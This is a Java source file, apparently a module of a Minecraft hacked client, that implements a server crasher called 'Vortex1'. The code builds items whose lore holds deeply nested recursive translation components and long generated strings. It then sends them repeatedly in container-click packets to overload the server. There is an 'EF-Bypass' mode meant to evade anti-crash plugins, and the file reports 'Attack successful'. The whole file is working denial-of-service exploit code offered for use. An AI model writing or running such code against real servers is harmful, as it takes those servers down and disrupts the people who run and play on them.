package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundCommandSuggestionPacket;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.BypassHelper;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.protocol.XynisProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataCustomName;
import us.whitedev.protocol.components.data.impl.DataLore;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Optional;

public class Vortex1 implements Crasher {
    private static final String METHOD_NAME = "Vortex1";
    private boolean enabled = false;
    private final String translateString = "{\"translate\":\"%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[\"..\"]}]}]}]}]}]}]}]}]}]}]}]}]}";

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int power =  Integer.parseInt(args[3]);
        String type = args[4].toLowerCase(Locale.ROOT);
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        if(!type.equals("unreachable")) {
            int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
            if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
                Int2ObjectMap<us.whitedev.protocol.components.objects.ItemStack> itemMap = new Int2ObjectOpenHashMap<>();
                us.whitedev.protocol.components.objects.ItemStack itemStack = new us.whitedev.protocol.components.objects.ItemStack(1, 1, getDataComponents(type, power));

                for (int i = 0; i < (type.equals("low-data") ? 1 : 10); ++i) itemMap.put(i, itemStack);

                PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 10,
                        PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                        itemStack, itemMap), packets);
            } else {
                Int2ObjectMap<ItemStack> itemMap = new Int2ObjectOpenHashMap<>();
                ItemStack itemStack = new ItemStack(Items.CHERRY_CHEST_BOAT, 1, Optional.of(getNBTComponents(type, power)));

                for (int i = 0; i < (type.equals("low-data") ? 1 : 10); ++i) itemMap.put(i, itemStack);

                PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 1, 1, ClickType.PICKUP, itemStack, itemMap));
            }
        }else{
            PacketHelper.send(new ServerboundCommandSuggestionPacket(0, "xynis"));
        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private DataComponents getDataComponents(String type, int power){
        String extra = bypassHelper.generateString(power, BypassHelper.StringType.BOOST2);
        String smallExtra = bypassHelper.generateString(1, BypassHelper.StringType.BOOST2);

        DataComponents components = new DataComponents();
        CompoundTag itemLoreText = bypassHelper.convert(translateString);
        List<CompoundTag> itemLore = new ArrayList<>();

        switch (type) {
            case "default", "ef-bypass" -> {
                CompoundTag itemName = bypassHelper.convert(type.equals("ef-bypass") ? smallExtra : extra);

                for (int i = 0; i < 4; ++i) itemLore.add(itemLoreText);

                DataCustomName dataCustomName = new DataCustomName(itemName);
                DataLore dataLore = new DataLore(itemLore);
                components.put(dataCustomName);
                components.put(dataLore);
            }
            case "low-data" -> {
                CompoundTag itemName = bypassHelper.convert(smallExtra);

                itemLore.add(itemLoreText);

                DataCustomName dataCustomName = new DataCustomName(itemName);
                DataLore dataLore = new DataLore(itemLore);
                components.put(dataCustomName);
                components.put(dataLore);
            }
        }

        return components;
    }

    private CompoundTag getNBTComponents(String type, int power) {
        String extra = bypassHelper.generateString(power, BypassHelper.StringType.BOOST2);
        String smallExtra = bypassHelper.generateString(1, BypassHelper.StringType.BOOST2);

        CompoundTag display = new CompoundTag();
        CompoundTag comp = new CompoundTag();
        ListTag lore = new ListTag();

        switch (type) {
            case "default", "ef-bypass" -> {
                StringTag loreLine = new StringTag(translateString);
                for (int i = 0; i < 4; ++i) lore.add(loreLine);

                display.put("Name", new StringTag(type.equals("ef-bypass") ? smallExtra : extra));
                display.put("Lore", lore);
                comp.put("display", display);
            }
            case "low-data" -> {
                lore.add(new StringTag(translateString));

                display.put("Name", new StringTag(smallExtra));
                display.put("Lore", lore);
                comp.put("display", display);
            }
        }

        return comp;
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions(){
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Power", OptionType.INTEGER),
                new OptionUtil("Type", OptionType.LIST, new String[]{"Default", "EF-Bypass", "Low-Data", "Unreachable"})
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[100], power[10], type[default]";
    }


    @Override
    public String getDescription() {
        return "Low/Medium Data Server Crasher";
    }
}